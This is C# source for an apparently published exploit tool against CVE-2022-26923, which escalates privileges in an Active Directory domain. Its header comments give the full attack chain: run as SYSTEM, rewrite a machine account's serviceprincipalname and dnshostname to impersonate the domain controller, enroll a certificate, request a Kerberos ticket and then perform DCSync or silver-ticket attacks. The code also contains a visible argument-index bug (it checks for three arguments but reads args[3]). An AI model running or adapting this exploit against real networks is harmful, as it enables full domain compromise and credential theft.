// Exploit for Active Directory Domain Privilege Escalation (CVE-2022–26923)
// Author: @domchell - MDSec
// This exploit can be used to update the relveant AD attributes required to enroll in a machine template as any machine in AD using an existing machine account
// Adjusting MS-DS-Machine-Account-Quota is not sufficient to stop this attack :)

// Steps:
// 1.       Escalate on any workstation (hint: krbrelayup ftw)
// 2.       Execute UpdateMachineAccount.exe as SYSTEM
// 3.       Enroll in machine template e.g. (Certify.exe request /ca:"ca.evil.corp\\CA" /template:Computer /machine /subject:CN=dc.evil.corp
// 4.       Request a TGT using the certificate e.g. (Rubeus.exe asktgt /user:dc$ /domain:evil.corp /dc:dc.evil.corp /certificate:<base64 cert> /enctype:AES256)
// 5.       Profit with s4u, silver ticket, dcsync etc...

// Credits: Oliver Lyak (@ly4k_) for CVE-2022–26923, Certipy and the excellent write up at https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4


using System;
using System.DirectoryServices;

namespace UpdateMachineAccount
{
    class Program
    {

        public static void SetAdInfo(string objectFilter,
                string domain, string dchost, string LdapDomain)
        {
            string connectionPrefix = "LDAP://" + LdapDomain;
            DirectoryEntry entry = new DirectoryEntry(connectionPrefix);
            DirectorySearcher mySearcher = new DirectorySearcher(entry);
            mySearcher.Filter = objectFilter;
            mySearcher.PropertiesToLoad.Add("serviceprincipalname");
            mySearcher.PropertiesToLoad.Add("dnshostname");

            SearchResult result = mySearcher.FindOne();

            Console.WriteLine("[*] Searching for object");

            if (result != null)
            {
                Console.WriteLine("[*] Found object");

                DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                if (result.Properties.Contains("serviceprincipalname"))
                {
                    Console.WriteLine("[*] Found serviceprincipalname");

                    var spnEntries = entryToUpdate.Properties["serviceprincipalname"];
                    int i;

                    Console.WriteLine("[*] Original list:");

                    foreach(var s in spnEntries)
                        Console.WriteLine(s.ToString());

                    for (i=0; i<spnEntries.Count;i++)
                    {
                        //Console.WriteLine(spn.ToString());
                        if (spnEntries[i].ToString().Contains(domain))
                        {
                            Console.WriteLine("[*] Found spn hostname:");
                            Console.WriteLine(spnEntries[i].ToString());
                            spnEntries.Remove(spnEntries[i]);
                        }
                    }

                    Console.WriteLine("\n[*] Removed hostnames complete");

                    Console.WriteLine("[*] New serviceprincipalnames (verify no dns hosts inside):");

                    foreach (var spn in spnEntries)
                        Console.WriteLine(spn.ToString());

                    entryToUpdate.Properties["serviceprincipalname"].Value = spnEntries.Value;

                }

                if (result.Properties.Contains("dnshostname"))
                {
                    Console.WriteLine("[*] Updating dnshostname attribute");
                    var dnsEntry = entryToUpdate.Properties["dnshostname"];
                    dnsEntry.Value = dchost;
                }

                Console.WriteLine("[*] Committing changes");
                entryToUpdate.CommitChanges();
            }
            else
            {
                Console.WriteLine("[!] Object not found");
            }
            entry.Close();
            entry.Dispose();
            mySearcher.Dispose();
        }

        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("[!] UpdateMachineAccount - @domchell");
                Console.WriteLine("[!] UpdateMachineAccount.exe <Machine CN> <domain fqdn> <machine hostname>");
                Console.WriteLine("[!] Example:\n\nUpdateMachineAccount.exe \"CN=TyrellLaptop,OU=Workstations,DC=evil,DC=corp\" evil.corp dc.evil.corp\n");
                return;
            }

            string LdapDomain = args[0].Trim();
            string domain = args[1].Trim();
            string dchost = args[3].Trim();

            string objectFilter = "(objectClass=*)";
            try
            {
                SetAdInfo(objectFilter, domain, dchost, LdapDomain);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error occured:");
                Console.WriteLine(e.Message);
            }

        }
    }
}